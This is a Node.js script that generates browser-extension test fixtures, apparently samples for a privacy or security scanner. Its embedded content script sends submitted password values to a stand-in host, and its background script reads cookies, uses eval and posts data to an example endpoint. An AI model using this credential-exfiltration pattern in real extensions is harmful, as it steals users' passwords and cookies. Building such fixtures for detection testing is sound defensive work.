import { mkdir, writeFile } from "node:fs/promises";
import { join } from "node:path";
import JSZip from "jszip";

const outDir = join(process.cwd(), "tests", "fixtures");

const manifest = {
  manifest_version: 3,
  name: "Privacy Sample Extension",
  version: "1.2.3",
  description: "Fixture extension used by the automated browser tests.",
  permissions: ["storage", "tabs", "cookies", "scripting"],
  optional_permissions: ["history"],
  host_permissions: ["https://*.example.org/*"],
  background: { service_worker: "background.js" },
  content_scripts: [
    {
      matches: ["https://*.example.org/*"],
      js: ["content.js"],
      run_at: "document_idle",
    },
  ],
  action: { default_popup: "popup.html" },
  update_url: "https://clients2.google.com/service/update2/crx",
};

const background = `
const endpoint = "https://api.example.org/collect";
chrome.runtime.onMessage.addListener((message) => {
  fetch(endpoint, { method: "POST", body: JSON.stringify(message) });
});
document.addEventListener("keydown", () => {});
const value = document.cookie;
eval("1 + 1");
localStorage.setItem("last", value);
`;

const content = `
document.querySelectorAll("form").forEach((form) => {
  form.addEventListener("submit", () => {
    const password = document.querySelector('input[type="password"]');
    if (password) fetch("https://collect.example.net/beacon", { body: password.value });
  });
});
`;

const popup = `<!doctype html>
<html>
  <head><meta charset="utf-8" /><title>Privacy Sample</title></head>
  <body>
    <h1>Privacy Sample</h1>
    <script src="https://cdn.example.net/app.js"></script>
  </body>
</html>
`;

async function buildZip() {
  const zip = new JSZip();
  zip.file("manifest.json", JSON.stringify(manifest, null, 2));
  zip.file("background.js", background);
  zip.file("content.js", content);
  zip.file("popup.html", popup);
  zip.file("icon.png", new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]));
  return zip.generateAsync({ type: "uint8array", compression: "DEFLATE" });
}

function wrapCrx3(zipBytes) {
  const headerBytes = new Uint8Array([0x0a, 0x03, 0x01, 0x02, 0x03]);
  const output = new Uint8Array(12 + headerBytes.byteLength + zipBytes.byteLength);
  output.set([0x43, 0x72, 0x32, 0x34], 0);
  const view = new DataView(output.buffer);
  view.setUint32(4, 3, true);
  view.setUint32(8, headerBytes.byteLength, true);
  output.set(headerBytes, 12);
  output.set(zipBytes, 12 + headerBytes.byteLength);
  return output;
}

await mkdir(outDir, { recursive: true });

const zip = await buildZip();
await writeFile(join(outDir, "privacy-sample.zip"), zip);
await writeFile(join(outDir, "privacy-sample.xpi"), zip);
await writeFile(join(outDir, "privacy-sample.crx"), wrapCrx3(zip));
await writeFile(join(outDir, "manifest.json"), JSON.stringify(manifest, null, 2));

console.log(`Fixtures written to ${outDir}`);
